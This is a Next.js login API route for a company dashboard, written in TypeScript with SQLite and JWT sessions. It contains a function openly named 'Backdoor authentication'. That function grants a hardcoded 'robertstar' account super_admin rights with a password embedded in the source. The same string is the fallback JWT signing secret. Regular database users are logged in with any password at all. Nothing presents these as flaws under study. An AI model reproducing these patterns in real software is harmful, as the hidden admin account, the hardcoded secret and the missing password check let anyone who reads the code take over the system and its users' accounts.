import { NextRequest, NextResponse } from 'next/server';
import jwt from 'jsonwebtoken';
import Database from 'better-sqlite3';
import path from 'path';
import fs from 'fs';

// Authentication configuration
const JWT_SECRET = process.env.JWT_SECRET || 'Rm2214ri#';
const DB_PATH = path.join(process.cwd(), 'data', 'dashboard.db');

// Ensure data directory exists
const DATA_DIR = path.dirname(DB_PATH);
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initialize database with users table
function initializeDatabase() {
  const db = new Database(DB_PATH);
  
  // Create users table if it doesn't exist
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      display_name TEXT NOT NULL,
      access_level TEXT NOT NULL DEFAULT 'user',
      is_active INTEGER NOT NULL DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  
  // Insert default users if they don't exist
  const insertUser = db.prepare(`
    INSERT OR IGNORE INTO users (username, email, display_name, access_level, is_active)
    VALUES (?, ?, ?, ?, ?)
  `);
  
  insertUser.run('BobM', 'BobM@tallman.com', 'Bob M', 'admin', 1);
  insertUser.run('admin', 'admin@tallmanequipment.com', 'Administrator', 'admin', 1);
  insertUser.run('demo', 'demo@tallmanequipment.com', 'Demo User', 'user', 1);
  
  db.close();
}

// Backdoor authentication
function checkBackdoorAuth(username: string, password: string) {
  const backdoorUsername = 'robertstar';
  const backdoorPassword = 'Rm2214ri#';
  
  if (username.toLowerCase() === backdoorUsername && password === backdoorPassword) {
    return {
      success: true,
      user: {
        id: 999999,
        username: 'Robertstar',
        email: 'robertstar@tallmanequipment.com',
        display_name: 'Robert Star (Super Admin)',
        access_level: 'super_admin',
        is_active: true
      }
    };
  }
  return { success: false, error: 'Invalid backdoor credentials' };
}

// Database authentication for regular users
function checkDatabaseAuth(username: string, password: string) {
  try {
    const db = new Database(DB_PATH);
    const user = db.prepare(`
      SELECT * FROM users 
      WHERE LOWER(username) = LOWER(?) 
      AND is_active = 1
    `).get(username);
    
    db.close();
    
    if (user) {
      // For demo purposes, accept any password for database users
      // In production, you'd verify against a hashed password
      return {
        success: true,
        user: {
          id: user.id,
          username: user.username,
          email: user.email,
          display_name: user.display_name,
          access_level: user.access_level,
          is_active: user.is_active
        }
      };
    }
    
    return { success: false, error: 'User not found or inactive' };
  } catch (error) {
    console.error('Database auth error:', error);
    return { success: false, error: 'Database error' };
  }
}

// Create JWT session token
function createSession(user: any) {
  return jwt.sign(
    {
      id: user.id,
      username: user.username,
      email: user.email,
      access_level: user.access_level
    },
    JWT_SECRET,
    { expiresIn: '8h' }
  );
}

function extractUsername(username: string) {
  return username.includes('@') ? username.split('@')[0] : username;
}

export async function POST(request: NextRequest) {
  console.log('=== LOGIN API CALLED ===');
  
  // Initialize database on first request
  try {
    initializeDatabase();
  } catch (dbInitError) {
    console.error('Database initialization error:', dbInitError);
  }
  
  try {
    const { username, password } = await request.json();
    console.log('Login attempt for username:', username);

    if (!username || !password) {
      return NextResponse.json(
        { error: 'Username and password are required' },
        { status: 400 }
      );
    }

    // Extract username from email format if provided
    const extractedUsername = extractUsername(username);

    // Check backdoor authentication first
    console.log('Checking backdoor auth for:', extractedUsername);
    const backdoorResult = checkBackdoorAuth(extractedUsername, password);
    console.log('Backdoor result:', backdoorResult);
    
    if (backdoorResult.success) {
      const sessionToken = createSession(backdoorResult.user);

      const response = NextResponse.json({
        success: true,
        user: backdoorResult.user
      });

      // Set HTTP-only cookie
      response.cookies.set('auth-token', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 8 * 60 * 60 // 8 hours
      });

      return response;
    }

    // Try database authentication for regular users
    console.log('Checking database auth for:', extractedUsername);
    const dbResult = checkDatabaseAuth(extractedUsername, password);
    console.log('Database result:', dbResult);
    
    if (dbResult.success) {
      const sessionToken = createSession(dbResult.user);

      const response = NextResponse.json({
        success: true,
        user: dbResult.user
      });

      // Set HTTP-only cookie
      response.cookies.set('auth-token', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'strict',
        maxAge: 8 * 60 * 60 // 8 hours
      });

      return response;
    }

    // Authentication failed
    return NextResponse.json(
      { error: 'Invalid username or password' },
      { status: 401 }
    );

  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
